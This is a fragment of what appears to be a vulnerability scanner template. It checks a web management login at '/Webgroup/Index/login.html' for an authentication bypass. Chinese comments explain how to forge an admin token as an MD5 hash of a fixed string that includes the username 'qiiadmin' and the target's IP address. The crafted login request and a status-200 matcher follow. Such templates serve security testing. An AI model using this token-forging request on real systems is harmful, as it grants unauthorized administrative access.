- raw:
  - 'token计算: md5("1/qiiadmin/从URL中提取IP地址/logincheck/subdomain")

    比如：md5("1/qiiadmin/101.xxx.xxx.111/logincheck/subdomain")


    GET /Webgroup/Index/login.html?user=qiiadmin&stime=1&token=<计算出的token值> HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.3096.117 Safari/537.36

    Referer: {{url}}

    Connection: close'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
